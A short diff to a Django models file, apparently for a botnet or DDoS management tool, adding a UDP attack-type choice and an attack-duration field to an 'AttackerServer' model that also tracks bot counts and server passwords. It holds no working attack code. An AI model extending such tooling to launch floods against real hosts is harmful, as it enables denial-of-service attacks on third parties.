@@ -1,6 +1,10 @@
 from django.db import models
+from django.core.validators import MaxValueValidator, MinValueValidator
 from django.conf import settings
 from django.utils import timezone
+
+
+DDOS_TYPE_CHOICES = [('udp', 'udp'), ('others...', 'others...')]
 
 
 # Create your models here.
@@ -74,6 +78,8 @@ class AttackerServer(models.Model):
     password = models.CharField(max_length=255)
     path = models.CharField(max_length=255, default="/root")
     number_of_new_bots = models.IntegerField(default=3)
+    DDoS_type = models.CharField(max_length=10, choices=DDOS_TYPE_CHOICES, default="udp")
+    DDoS_duration = models.IntegerField(default=30, validators=[MaxValueValidator(1000000), MinValueValidator(10)])
 
 
 class MaliciousClient(models.Model):
